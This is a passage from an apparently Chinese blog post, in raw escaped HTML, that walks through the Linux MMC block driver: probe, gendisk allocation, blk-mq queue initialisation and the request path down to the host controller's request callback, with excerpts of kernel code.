&lt;p&gt;&lt;span&gt;按照Linux驱动模型，接下来要完成的是设备和驱动在总线上的匹配工作，最终调用驱动的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;probe()&lt;/code&gt;函数。调用的函数依次是：&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
mmc_bus_probe(&amp;amp;card.dev) --&amp;gt; mmc_blk_probe(&amp;amp;card)
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;Linux块设备驱动初始化一般包括如下几个方面：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;申请设备号，并将块设备驱动注册到内核。 &lt;span class=&quot;cnblogs_code&quot;&gt;register_blkdev()&lt;/span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;初始化请求队列。 &lt;span class=&quot;cnblogs_code&quot;&gt;blk_init_queue() / blk_alloc_queue()&lt;/span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;分配gendisk结构，并进行初始化。 &lt;span class=&quot;cnblogs_code&quot;&gt;alloc_disk()&lt;/span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;添加gendisk。 &lt;span class=&quot;cnblogs_code&quot;&gt;add_disk()&lt;/span&gt; &lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;第3节MMC驱动注册中，函数 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_init()&lt;/span&gt; 调用 &lt;span class=&quot;cnblogs_code&quot;&gt;register_blkdev(MMC_BLOCK_MAJOR, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)&lt;/span&gt; 完成了设备号的申请，将块设备注册到内核中。下文将从 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_probe(card)&lt;/span&gt;入手分析其他几个步骤的实现。&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;51-mmc_blk_probecard&quot;&gt;&lt;span&gt;5.1 mmc_blk_probe(card)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;18&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_blk_data {
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; device   *&lt;span&gt;parent;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; gendisk  *&lt;span&gt;disk;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_queue queue;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; list_head part;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; list_head rpmbs;

    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    flags;

    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    usage;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    read_only;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    part_type;
    unsigned &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt;    reset_done;
    ... ...
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_blk_probe(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_blk_data *md, *&lt;span&gt;part_md;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; cap_str[&lt;span&gt;10&lt;/span&gt;&lt;span&gt;];

    ... ...
    card&lt;/span&gt;-&amp;gt;complete_wq = alloc_workqueue(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc_complete&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
            WQ_MEM_RECLAIM &lt;/span&gt;| WQ_HIGHPRI, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 分配和初始化gendisk结构，初始化请求队列&lt;/span&gt;
    md =&lt;span&gt; mmc_blk_alloc(card);

    string_get_size((u64)get_capacity(md&lt;/span&gt;-&amp;gt;disk), &lt;span&gt;512&lt;/span&gt;&lt;span&gt;, STRING_UNITS_2,
            cap_str, &lt;/span&gt;&lt;span&gt;sizeof&lt;/span&gt;&lt;span&gt;(cap_str));

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_blk_alloc_parts(card, md))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    dev_set_drvdata(&lt;/span&gt;&amp;amp;card-&amp;gt;&lt;span&gt;dev, md);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 添加gendisk&lt;/span&gt;
    &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_add_disk(md))
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;

    list_for_each_entry(part_md, &lt;/span&gt;&amp;amp;md-&amp;gt;&lt;span&gt;part, part) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_add_disk(part_md))
            &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt; &lt;span&gt;out&lt;/span&gt;&lt;span&gt;;
    }

    ...
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_probe(card)&lt;/span&gt; 为MMC card完成所有块设备驱动有关的工作，主要调用了两个重要的函数：&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_alloc(card)&lt;/span&gt; &lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_disk(md)&lt;/span&gt; &lt;br/&gt;&lt;/code&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;52-mmc_blk_alloccard&quot;&gt;&lt;span&gt;5.2 mmc_blk_alloc(card)&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_alloc(card)&lt;/span&gt; 为MMC card初始化请求队列，函数调用过程为：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;30&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
mmc_blk_alloc(card) --&amp;gt; mmc_blk_alloc_req() --&amp;gt; mmc_init_queue(&amp;amp;md-&amp;gt;queue, card) --&amp;gt; blk_mq_init_queue()
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_blk_data *mmc_blk_alloc(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    sector_t size;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!mmc_card_sd(card) &amp;amp;&amp;amp;&lt;span&gt; mmc_card_blockaddr(card)) {
        size &lt;/span&gt;= card-&amp;gt;&lt;span&gt;ext_csd.sectors;
    } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
        size &lt;/span&gt;= (&lt;span&gt;typeof&lt;/span&gt;(sector_t))card-&amp;gt;csd.capacity &amp;lt;&amp;lt; (card-&amp;gt;csd.read_blkbits - &lt;span&gt;9&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; mmc_blk_alloc_req(card, &amp;amp;card-&amp;gt;dev, size, &lt;span&gt;false&lt;/span&gt;&lt;span&gt;, NULL, MMC_BLK_DATA_AREA_MAIN);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; block_device_operations mmc_bdops =&lt;span&gt; {
    .open           &lt;/span&gt;=&lt;span&gt; mmc_blk_open,
    .release        &lt;/span&gt;=&lt;span&gt; mmc_blk_release,
    .getgeo         &lt;/span&gt;=&lt;span&gt; mmc_blk_getgeo,
    .owner          &lt;/span&gt;=&lt;span&gt; THIS_MODULE,
    .ioctl          &lt;/span&gt;=&lt;span&gt; mmc_blk_ioctl,
#ifdef CONFIG_COMPAT
    .compat_ioctl       &lt;/span&gt;=&lt;span&gt; mmc_blk_compat_ioctl,
&lt;/span&gt;&lt;span&gt;#endif&lt;/span&gt;&lt;span&gt;
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_blk_data *mmc_blk_alloc_req(&lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; device *parent,  sector_t size,  &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; default_ro,
        &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;char&lt;/span&gt; *subname,  &lt;span&gt;int&lt;/span&gt;&lt;span&gt; area_type)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_blk_data *&lt;span&gt;md;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; devidx, ret;

    devidx &lt;/span&gt;= ida_simple_get(&amp;amp;mmc_blk_ida, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, max_devices, GFP_KERNEL);
    ... ...
    md &lt;/span&gt;= kzalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; mmc_blk_data), GFP_KERNEL);

    md&lt;/span&gt;-&amp;gt;area_type =&lt;span&gt; area_type;

    md&lt;/span&gt;-&amp;gt;read_only =&lt;span&gt; mmc_blk_readonly(card);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 分配gendisk结构 &lt;/span&gt;
    md-&amp;gt;disk =&lt;span&gt; alloc_disk(perdev_minors);

    INIT_LIST_HEAD(&lt;/span&gt;&amp;amp;md-&amp;gt;&lt;span&gt;part);
    INIT_LIST_HEAD(&lt;/span&gt;&amp;amp;md-&amp;gt;&lt;span&gt;rpmbs);
    md&lt;/span&gt;-&amp;gt;usage = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化请求队列 &lt;/span&gt;
    ret = mmc_init_queue(&amp;amp;md-&amp;gt;&lt;span&gt;queue, card);

    md&lt;/span&gt;-&amp;gt;queue.blkdata =&lt;span&gt; md;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化gendisk结构成员&lt;/span&gt;
    md-&amp;gt;disk-&amp;gt;major =&lt;span&gt; MMC_BLOCK_MAJOR;
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;first_minor = devidx *&lt;span&gt; perdev_minors;
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 为MMC card定义了block_device_operations结构体&lt;/span&gt;
    md-&amp;gt;disk-&amp;gt;fops = &amp;amp;&lt;span&gt;mmc_bdops;
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;private_data =&lt;span&gt; md;
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;queue = md-&amp;gt;&lt;span&gt;queue.queue;
    md&lt;/span&gt;-&amp;gt;parent =&lt;span&gt; parent;
    set_disk_ro(md&lt;/span&gt;-&amp;gt;disk, md-&amp;gt;read_only ||&lt;span&gt; default_ro);
    md&lt;/span&gt;-&amp;gt;disk-&amp;gt;flags =&lt;span&gt; GENHD_FL_EXT_DEVT;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (area_type &amp;amp; (MMC_BLK_DATA_AREA_RPMB |&lt;span&gt; MMC_BLK_DATA_AREA_BOOT))
        md&lt;/span&gt;-&amp;gt;disk-&amp;gt;flags |= GENHD_FL_NO_PART_SCAN |&lt;span&gt; GENHD_FL_SUPPRESS_PARTITION_INFO;

    snprintf(md&lt;/span&gt;-&amp;gt;disk-&amp;gt;disk_name, &lt;span&gt;sizeof&lt;/span&gt;(md-&amp;gt;disk-&amp;gt;&lt;span&gt;disk_name),
            &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmcblk%u%s&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, card-&amp;gt;host-&amp;gt;index, subname ? subname : &lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;);

    set_capacity(md&lt;/span&gt;-&amp;gt;&lt;span&gt;disk, size);

    ... ...
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; md;
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;值得注意的是， &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_blk_alloc_req()&lt;/span&gt; 函数中为将MMC card gendisk结构体的fops赋值为 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bdops&lt;/span&gt; ，即为MMC card定义了 &lt;span class=&quot;cnblogs_code&quot;&gt;open&lt;/span&gt; ， &lt;span class=&quot;cnblogs_code&quot;&gt;release&lt;/span&gt; ， &lt;span class=&quot;cnblogs_code&quot;&gt;getgeo&lt;/span&gt; ， &lt;span class=&quot;cnblogs_code&quot;&gt;ioctl&lt;/span&gt; 等操作的回调函数。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;53-mmc_init_queuemd-queue-card&quot;&gt;&lt;span&gt;5.3 mmc_init_queue(&amp;amp;md-&amp;gt;queue, card)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;24&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; blk_mq_ops mmc_mq_ops =&lt;span&gt; {
    .queue_rq       &lt;/span&gt;=&lt;span&gt; mmc_mq_queue_rq,
    .init_request   &lt;/span&gt;=&lt;span&gt; mmc_mq_init_request,
    .exit_request   &lt;/span&gt;=&lt;span&gt; mmc_mq_exit_request,
    .complete       &lt;/span&gt;=&lt;span&gt; mmc_blk_mq_complete,
    .timeout        &lt;/span&gt;=&lt;span&gt; mmc_mq_timed_out,
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; mmc_init_queue(&lt;span&gt;struct&lt;/span&gt; mmc_queue *mq, &lt;span&gt;struct&lt;/span&gt; mmc_card *&lt;span&gt;card)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *host = card-&amp;gt;&lt;span&gt;host;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; ret;

    mq&lt;/span&gt;-&amp;gt;card =&lt;span&gt; card;
    mq&lt;/span&gt;-&amp;gt;use_cqe = host-&amp;gt;&lt;span&gt;cqe_enabled;

    spin_lock_init(&lt;/span&gt;&amp;amp;mq-&amp;gt;&lt;span&gt;lock&lt;/span&gt;&lt;span&gt;);

    memset(&lt;/span&gt;&amp;amp;mq-&amp;gt;tag_set, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;sizeof&lt;/span&gt;(mq-&amp;gt;&lt;span&gt;tag_set));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; mq-&amp;gt;tag_set.ops设置为mmc_mq_ops&lt;/span&gt;
    mq-&amp;gt;tag_set.ops = &amp;amp;&lt;span&gt;mmc_mq_ops;
    ... ...
    mq&lt;/span&gt;-&amp;gt;tag_set.driver_data =&lt;span&gt; mq;

    ret &lt;/span&gt;= blk_mq_alloc_tag_set(&amp;amp;mq-&amp;gt;&lt;span&gt;tag_set);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 初始化请求队列&lt;/span&gt;
    mq-&amp;gt;queue = blk_mq_init_queue(&amp;amp;mq-&amp;gt;&lt;span&gt;tag_set);

    ... ...
    mq&lt;/span&gt;-&amp;gt;queue-&amp;gt;queuedata =&lt;span&gt; mq;
    blk_queue_rq_timeout(mq&lt;/span&gt;-&amp;gt;queue, &lt;span&gt;60&lt;/span&gt; *&lt;span&gt; HZ);

    mmc_setup_queue(mq, card);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; request_queue *blk_mq_init_queue(&lt;span&gt;struct&lt;/span&gt; blk_mq_tag_set *&lt;span&gt;set&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request_queue *uninit_q, *&lt;span&gt;q;

    uninit_q &lt;/span&gt;= blk_alloc_queue_node(GFP_KERNEL, &lt;span&gt;set&lt;/span&gt;-&amp;gt;&lt;span&gt;numa_node);
    q &lt;/span&gt;= blk_mq_init_allocated_queue(&lt;span&gt;set&lt;/span&gt;&lt;span&gt;, uninit_q);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; q;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt; request_queue *blk_mq_init_allocated_queue(&lt;span&gt;struct&lt;/span&gt; blk_mq_tag_set *&lt;span&gt;set&lt;/span&gt;&lt;span&gt;,
                          &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request_queue *&lt;span&gt;q)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 用set-&amp;gt;ops (mmc_mq_ops)来初始化request_queue的mq_ops成员&lt;/span&gt;
    q-&amp;gt;mq_ops = &lt;span&gt;set&lt;/span&gt;-&amp;gt;&lt;span&gt;ops;
    ... ...
    blk_queue_make_request(q, blk_mq_make_request);
    ... ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init_queue(&amp;amp;md-&amp;gt;queue, card)&lt;/span&gt; 最终调用 &lt;span class=&quot;cnblogs_code&quot;&gt;blk_queue_make_request(q, blk_mq_make_request)&lt;/span&gt; 初始化了请求队列（制造请求函数）。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt;另外，也使用 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_ops&lt;/span&gt; 初始化了 &lt;span class=&quot;cnblogs_code&quot;&gt;request_queue&lt;/span&gt; 的 &lt;span class=&quot;cnblogs_code&quot;&gt;mq_ops&lt;/span&gt; 成员，下文会提到。&lt;br/&gt;至此，块设备驱动注册工作基本完成。&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;4.1节介绍MMX设备初始化时提到，驱动编写过程中特别地为host编写了 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_ops&lt;/span&gt; ，而至目前仍未介绍到其被使用的地方，本节将从请求队列入手，通过一个简单的情形，分析 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_ops&lt;/span&gt; 操作函数的回调过程。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;当对mmc card发起块设备I/O动作时，内核会首先调用到之前初始化的 &lt;span class=&quot;cnblogs_code&quot;&gt;blk_mq_make_request()&lt;/span&gt; 函数（定义在 &lt;span class=&quot;cnblogs_code&quot;&gt;block/blk-mq.c&lt;/span&gt; ），在特定情况下调用 &lt;span class=&quot;cnblogs_code&quot;&gt;blk_mq_try_issue_directly()&lt;/span&gt; ，最终一步步调用到 &lt;span class=&quot;cnblogs_code&quot;&gt;__blk_mq_issue_directly()&lt;/span&gt; 。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;44&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_qc_t blk_mq_make_request(&lt;span&gt;struct&lt;/span&gt; request_queue *q, &lt;span&gt;struct&lt;/span&gt; bio *&lt;span&gt;bio)
{
    ...
    blk_mq_try_issue_directly(data.hctx, rq, &lt;/span&gt;&amp;amp;&lt;span&gt;cookie);
    ..
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; blk_mq_try_issue_directly(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *rq, blk_qc_t *&lt;span&gt;cookie)
{
    ...
    ret &lt;/span&gt;= __blk_mq_try_issue_directly(hctx, rq, cookie, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;true&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ret == BLK_STS_RESOURCE || ret ==&lt;span&gt; BLK_STS_DEV_RESOURCE)
        blk_mq_request_bypass_insert(rq, &lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (ret !=&lt;span&gt; BLK_STS_OK)
        blk_mq_end_request(rq, ret);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_status_t __blk_mq_try_issue_directly(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *rq, blk_qc_t *cookie, &lt;span&gt;bool&lt;/span&gt; bypass_insert, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; last)
{
    ... 
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; __blk_mq_issue_directly(hctx, rq, cookie, last);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_status_t __blk_mq_issue_directly(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
        &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *rq, blk_qc_t *cookie, &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; last)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request_queue *q = rq-&amp;gt;&lt;span&gt;q;
    ... 
    ret &lt;/span&gt;= q-&amp;gt;mq_ops-&amp;gt;queue_rq(hctx, &amp;amp;&lt;span&gt;bd);
    ... 
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;5.3一节中提到 &lt;span class=&quot;cnblogs_code&quot;&gt;q-&amp;gt;mq_ops&lt;/span&gt; 指向 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_ops&lt;/span&gt; ，因此此处最终会回调函数 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_ops-&amp;gt;queue_rq()&lt;/span&gt; ，即 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_mq_queue_rq()&lt;/span&gt; ，最终回调至 &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_ops-&amp;gt;request(host, mrq)&lt;/span&gt; 。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
mmc_mq_queue_rq() --&amp;gt; mmc_blk_mq_issue_rq() --&amp;gt; mmc_blk_mq_issue_rw_rq() --&amp;gt;&lt;span&gt; mmc_start_request() &lt;/span&gt;--&amp;gt; __mmc_start_request() --&amp;gt; host-&amp;gt;ops-&amp;gt;request(host, mrq)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; blk_status_t mmc_mq_queue_rq(&lt;span&gt;struct&lt;/span&gt; blk_mq_hw_ctx *&lt;span&gt;hctx,
                    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; blk_mq_queue_data *&lt;span&gt;bd)
{
    ...
    issued &lt;/span&gt;=&lt;span&gt; mmc_blk_mq_issue_rq(mq, req);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;enum&lt;/span&gt; mmc_issued mmc_blk_mq_issue_rq(&lt;span&gt;struct&lt;/span&gt; mmc_queue *mq, &lt;span&gt;struct&lt;/span&gt; request *&lt;span&gt;req)
{
    ...
    ret &lt;/span&gt;=&lt;span&gt; mmc_blk_mq_issue_rw_rq(mq, req);
    ...
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; mmc_blk_mq_issue_rw_rq(&lt;span&gt;struct&lt;/span&gt; mmc_queue *&lt;span&gt;mq,
                  &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; request *&lt;span&gt;req)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_queue_req *mqrq =&lt;span&gt; req_to_mmc_queue_req(req);
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *host = mq-&amp;gt;card-&amp;gt;&lt;span&gt;host;
    ... ...

    err &lt;/span&gt;= mmc_start_request(host, &amp;amp;mqrq-&amp;gt;&lt;span&gt;brq.mrq);

    ... ...
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; err;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;int&lt;/span&gt; mmc_start_request(&lt;span&gt;struct&lt;/span&gt; mmc_host *host, &lt;span&gt;struct&lt;/span&gt; mmc_request *&lt;span&gt;mrq)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;

    init_completion(&lt;/span&gt;&amp;amp;mrq-&amp;gt;&lt;span&gt;cmd_completion);

    mmc_retune_hold(host);

    ...
    WARN_ON(&lt;/span&gt;!host-&amp;gt;&lt;span&gt;claimed);

    err &lt;/span&gt;=&lt;span&gt; mmc_mrq_prep(host, mrq);
    ...

    __mmc_start_request(host, mrq);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
